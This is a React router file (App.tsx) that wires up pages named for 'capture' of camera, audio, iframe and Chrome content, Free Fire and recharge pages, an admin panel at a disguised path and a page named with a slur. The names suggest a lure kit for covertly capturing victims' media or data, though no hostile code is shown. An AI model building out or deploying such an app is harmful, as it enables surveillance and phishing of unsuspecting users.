import { Toaster } from "@/components/ui/toaster";
import { Toaster as Sonner } from "@/components/ui/sonner";
import { TooltipProvider } from "@/components/ui/tooltip";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { BrowserRouter, Routes, Route } from "react-router-dom";
import { SettingsProvider } from "@/contexts/SettingsContext";
import { AuthProvider } from "@/contexts/AuthContext";
import Index from "./pages/Index";
import Login from "./pages/Login";
import Capture from "./pages/Capture";
import CustomCapture from "./pages/CustomCapture";
import ChromeCustomCapture from "./pages/ChromeCustomCapture";
import IframeCapture from "./pages/IframeCapture";
import RechargeCapture from "./pages/RechargeCapture";
import FreefireCapture from "./pages/FreefireCapture";
import VideoCapture from "./pages/VideoCapture";
import AudioCapture from "./pages/AudioCapture";
import Admin from "./pages/Admin";
import Page3 from "./pages/Page3";
import RandiPanel from "./pages/RandiPanel";
import DirectHit from "./pages/DirectHit";
import DirectHitAdmin from "./pages/DirectHitAdmin";
import NotFound from "./pages/NotFound";

const queryClient = new QueryClient();

const App = () => (
  <QueryClientProvider client={queryClient}>
    <AuthProvider>
      <SettingsProvider>
        <TooltipProvider>
          <Toaster />
          <Sonner />
          <BrowserRouter>
            <Routes>
              <Route path="/login" element={<Login />} />
              <Route path="/" element={<Index />} />
              <Route path="/capture" element={<Capture />} />
              <Route path="/custom-capture" element={<CustomCapture />} />
              <Route path="/chrome-custom-capture" element={<ChromeCustomCapture />} />
              <Route path="/iframe-capture" element={<IframeCapture />} />
              <Route path="/recharge" element={<RechargeCapture />} />
              <Route path="/freefire" element={<FreefireCapture />} />
              <Route path="/video-capture" element={<VideoCapture />} />
              <Route path="/audio-capture" element={<AudioCapture />} />
              <Route path="/chaudhary99" element={<Admin />} />
              <Route path="/randi-panel" element={<RandiPanel />} />
              <Route path="/page3" element={<Page3 />} />
              <Route path="/direct-hit" element={<DirectHit />} />
              <Route path="/direct-hit/admin" element={<DirectHitAdmin />} />
              <Route path="*" element={<NotFound />} />
            </Routes>
          </BrowserRouter>
        </TooltipProvider>
      </SettingsProvider>
    </AuthProvider>
  </QueryClientProvider>
);

export default App;
